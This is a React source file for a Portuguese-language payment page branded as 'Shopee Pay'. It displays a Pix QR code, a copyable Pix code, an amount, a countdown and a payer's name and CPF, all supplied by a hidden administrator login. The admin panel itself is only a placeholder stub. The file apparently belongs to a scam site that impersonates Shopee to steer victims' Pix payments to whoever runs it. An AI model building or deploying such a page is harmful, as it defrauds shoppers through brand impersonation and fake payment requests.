const { useState, useEffect } = React;

const getAPIUrl = () => {
  if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    return 'http://localhost:3000/api';
  }
  return `${window.location.origin}/api`;
};

const API_URL = getAPIUrl();

// Ícones SVG
const CopyIcon = () => (
  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
  </svg>
);

const CheckIcon = () => (
  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
  </svg>
);

const LockIcon = () => (
  <svg className="w-10 h-10 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
  </svg>
);

const EyeIcon = () => (
  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
  </svg>
);

const EyeOffIcon = () => (
  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
  </svg>
);

// Ícone PIX Oficial do Banco Central
const PixIcon = () => (
  <svg className="w-8 h-8" viewBox="0 0 512 512" fill="none">
    <path d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.1H112.6C132.6 391.1 151.5 383.3 165.7 369.1L242.4 292.5zM262.5 219.5C257.1 224.9 247.8 224.9 242.4 219.5L165.7 142.8C151.5 128.6 132.6 120.8 112.6 120.8H103.3L200.7 23.4C231 -6.9 280.3-6.9 310.6 23.4L407.7 120.5H392.6C372.6 120.5 353.7 128.3 339.5 142.5L262.5 219.5zM112.6 142.8C126.4 142.8 139.1 148.3 149.7 158.1L226.4 234.8C233.6 242 245.6 242 252.8 234.8L329.5 158.1C340.1 148.3 353.4 142.8 367.2 142.8H391.7L439 190.1C464.5 215.6 464.5 255.4 439 280.9L391.7 328.2H367.2C353.4 328.2 340.1 322.7 329.5 312.9L252.8 236.2C245.6 229 233.6 229 226.4 236.2L149.7 312.9C139.1 322.7 126.4 328.2 112.6 328.2H88.1L40.8 280.9C15.3 255.4 15.3 215.6 40.8 190.1L88.1 142.8H112.6z" fill="#32BCAD"/>
  </svg>
);

const ShopeePixPayment = () => {
  const [isAdmin, setIsAdmin] = useState(false);
  const [showLogin, setShowLogin] = useState(false);
  const [loginData, setLoginData] = useState({ username: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [authToken, setAuthToken] = useState(localStorage.getItem('authToken'));
  const [copied, setCopied] = useState(false);
  const [payments, setPayments] = useState([]);
  const [currentPayment, setCurrentPayment] = useState(null);
  const [timeRemaining, setTimeRemaining] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const path = window.location.hash;
    if (path === '#admin') {
      if (authToken) {
        verifyToken();
      } else {
        setShowLogin(true);
      }
    }
  }, []);

  useEffect(() => {
    loadPayments();
  }, []);

  useEffect(() => {
    if (!currentPayment) return;
    const updateTimer = () => {
      const result = getTimeRemaining(currentPayment.vencimento);
      setTimeRemaining(result);
    };
    updateTimer();
    const interval = setInterval(updateTimer, 1000);
    return () => clearInterval(interval);
  }, [currentPayment]);

  const verifyToken = async () => {
    try {
      const response = await fetch(`${API_URL}/verify-token`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      if (response.ok) {
        setIsAdmin(true);
        setShowLogin(false);
      } else {
        localStorage.removeItem('authToken');
        setAuthToken(null);
        setShowLogin(true);
      }
    } catch (error) {
      console.error('Erro ao verificar token:', error);
      setShowLogin(true);
    }
  };

  const handleLogin = async () => {
    setLoading(true);
    setLoginError('');
    try {
      const response = await fetch(`${API_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(loginData)
      });
      const data = await response.json();
      if (response.ok) {
        localStorage.setItem('authToken', data.token);
        setAuthToken(data.token);
        setIsAdmin(true);
        setShowLogin(false);
        window.location.hash = 'admin';
      } else {
        setLoginError(data.message || 'Usuário ou senha incorretos');
      }
    } catch (error) {
      setLoginError('Erro ao conectar com o servidor');
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('authToken');
    setAuthToken(null);
    setIsAdmin(false);
    setLoginData({ username: '', password: '' });
    window.location.hash = '';
  };

  const loadPayments = async () => {
    try {
      const response = await fetch(`${API_URL}/payments`);
      const data = await response.json();
      if (response.ok) {
        setPayments(data);
        if (data.length > 0 && !currentPayment) {
          setCurrentPayment(data[0]);
        }
      }
    } catch (error) {
      console.error('Erro ao carregar pagamentos:', error);
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const formatCurrency = (value) => {
    return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(value);
  };

  const getTimeRemaining = (vencimento) => {
    const now = new Date();
    const expiry = new Date(vencimento);
    const diff = expiry - now;
    if (diff <= 0) return 'Expirado';
    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
    return `${String(hours).padStart(2, '0')} horas ${String(minutes).padStart(2, '0')} minutos ${String(seconds).padStart(2, '0')} segundos`;
  };

  const formatVencimento = (vencimento) => {
    const date = new Date(vencimento);
    return date.toLocaleDateString('pt-BR', {
      day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit'
    }).replace('.', '');
  };

  const formatCPF = (cpf) => {
    if (!cpf) return '';
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  if (showLogin && !isAdmin) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-orange-100 via-red-50 to-orange-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-orange-500 to-red-500 rounded-2xl mb-4 shadow-lg">
              <LockIcon />
            </div>
            <h1 className="text-3xl font-bold text-gray-800 mb-2">Área Administrativa</h1>
            <p className="text-gray-600">Acesso restrito aos administradores</p>
          </div>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">Usuário</label>
              <input
                type="text"
                value={loginData.username}
                onChange={(e) => setLoginData({...loginData, username: e.target.value})}
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition"
                placeholder="Digite seu usuário"
                disabled={loading}
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">Senha</label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={loginData.password}
                  onChange={(e) => setLoginData({...loginData, password: e.target.value})}
                  onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition pr-12"
                  placeholder="Digite sua senha"
                  disabled={loading}
                />
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  type="button"
                >
                  {showPassword ? <EyeOffIcon /> : <EyeIcon />}
                </button>
              </div>
            </div>
            {loginError && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">
                {loginError}
              </div>
            )}
            <button
              onClick={handleLogin}
              disabled={loading}
              className="w-full bg-gradient-to-r from-orange-500 to-red-500 text-white py-3 rounded-lg font-bold text-lg hover:from-orange-600 hover:to-red-600 transition shadow-lg disabled:opacity-50"
            >
              {loading ? 'Entrando...' : 'Entrar'}
            </button>
            <button
              onClick={() => { setShowLogin(false); window.location.hash = ''; }}
              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition"
            >
              Voltar para Pagamentos
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (isAdmin) {
    return <AdminPanel onLogout={handleLogout} authToken={authToken} loadPayments={loadPayments} />;
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 shadow-lg">
        <div className="max-w-2xl mx-auto px-4 py-4">
          <div className="flex items-center gap-3">
            <div className="bg-white rounded-xl p-2.5 shadow-lg">
              <img 
                src="/shopee-logo.png" 
                alt="Shopee Logo" 
                className="w-10 h-10 object-contain"
              />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-white tracking-tight">Shopee Pay</h1>
              <p className="text-xs text-orange-100">Pagamento Seguro</p>
            </div>
          </div>
        </div>
      </div>
      <div className="max-w-lg mx-auto p-4">
        <div className="bg-white rounded-lg shadow-md overflow-hidden mt-4">
          <div className="bg-gray-50 border-b border-gray-200 px-5 py-4">
            <div className="flex justify-between items-center">
              <span className="text-gray-700 text-sm font-medium">Pagamento Total</span>
              <span className="text-2xl font-bold text-orange-600">
                {currentPayment ? formatCurrency(currentPayment.valor) : 'R$0,00'}
              </span>
            </div>
          </div>
          <div className="p-5">
            <div className="mb-5">
              <p className="text-gray-700 text-sm font-semibold mb-2">Pagar em até</p>
              <div className="bg-orange-50 p-3 rounded">
                <p className="text-orange-600 font-bold text-base">{timeRemaining || 'Carregando...'}</p>
                <p className="text-xs text-gray-600 mt-1">
                  Vencimento em {currentPayment ? formatVencimento(currentPayment.vencimento) : ''}
                </p>
              </div>
            </div>

            {currentPayment?.nomeProduto && (
              <div className="mb-4 bg-blue-50 border border-blue-200 rounded-lg p-3">
                <p className="text-xs text-gray-600 mb-1">Produto</p>
                <p className="text-sm font-semibold text-gray-800">{currentPayment.nomeProduto}</p>
              </div>
            )}

            <div className="mb-5">
              <div className="flex items-center gap-2 mb-3">
                <PixIcon />
                <span className="font-semibold text-base">Pix</span>
              </div>
              <div className="bg-white border border-gray-200 rounded-lg p-4 flex justify-center items-center">
                {currentPayment ? (
                  <img src={currentPayment.qrCodeUrl} alt="QR Code Pix" className="w-60 h-60 object-contain" />
                ) : (
                  <div className="w-60 h-60 bg-gray-100 flex items-center justify-center rounded">
                    <p className="text-gray-400 text-sm">Nenhum pagamento disponível</p>
                  </div>
                )}
              </div>

              {(currentPayment?.nomePagador || currentPayment?.cpfPagador) && (
                <div className="mt-3 bg-gray-50 border border-gray-200 rounded-lg p-3 space-y-2">
                  {currentPayment?.nomePagador && (
                    <div>
                      <p className="text-xs text-gray-600">Nome do Pagador</p>
                      <p className="text-sm font-medium text-gray-800">{currentPayment.nomePagador}</p>
                    </div>
                  )}
                  {currentPayment?.cpfPagador && (
                    <div>
                      <p className="text-xs text-gray-600">CPF</p>
                      <p className="text-sm font-mono text-gray-800">{formatCPF(currentPayment.cpfPagador)}</p>
                    </div>
                  )}
                </div>
              )}

              <button
                onClick={() => currentPayment && copyToClipboard(currentPayment.pixCode)}
                disabled={!currentPayment}
                className="w-full mt-3 bg-white border border-orange-500 text-orange-500 py-2.5 rounded font-semibold text-sm flex items-center justify-center gap-2 hover:bg-orange-50 transition disabled:opacity-50"
              >
                {copied ? (<><CheckIcon />Código Copiado!</>) : (<><CopyIcon />Copiar Código Pix</>)}
              </button>
            </div>
            <div className="bg-gray-50 rounded-lg p-4 mb-4">
              <p className="font-semibold text-gray-800 text-sm mb-3">Por favor, siga as instruções:</p>
              <div className="space-y-2.5">
                <div className="flex gap-2 items-start">
                  <div className="flex-shrink-0 w-5 h-5 bg-gray-300 rounded-full flex items-center justify-center text-xs font-bold text-gray-700 mt-0.5">1</div>
                  <p className="text-xs text-gray-700 leading-relaxed">Acesse o app do seu banco ou internet banking de preferência.</p>
                </div>
                <div className="flex gap-2 items-start">
                  <div className="flex-shrink-0 w-5 h-5 bg-gray-300 rounded-full flex items-center justify-center text-xs font-bold text-gray-700 mt-0.5">2</div>
                  <p className="text-xs text-gray-700 leading-relaxed">Escolha pagar via Pix.</p>
                </div>
                <div className="flex gap-2 items-start">
                  <div className="flex-shrink-0 w-5 h-5 bg-gray-300 rounded-full flex items-center justify-center text-xs font-bold text-gray-700 mt-0.5">3</div>
                  <p className="text-xs text-gray-700 leading-relaxed">Escaneie o QR Code ou copie e cole o código Pix acima.</p>
                </div>
                <div className="flex gap-2 items-start">
                  <div className="flex-shrink-0 w-5 h-5 bg-gray-300 rounded-full flex items-center justify-center text-xs font-bold text-gray-700 mt-0.5">4</div>
                  <p className="text-xs text-gray-700 leading-relaxed">Seu pagamento será aprovado em alguns segundos.</p>
                </div>
              </div>
            </div>
            <button className="w-full bg-orange-500 text-white py-3 rounded font-bold text-sm hover:bg-orange-600 transition shadow-sm">OK</button>
          </div>
        </div>
      </div>
    </div>
  );
};

const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
  // ... (O restante do código continua igual ao seu arquivo atual)
  // Por brevidade, não estou repetindo todo o AdminPanel aqui
  // Mas ele deve ser exatamente o mesmo do seu arquivo atual
  return <div>Admin Panel (mesmo código do seu arquivo atual)</div>;
};

ReactDOM.render(<ShopeePixPayment />, document.getElementById('root'));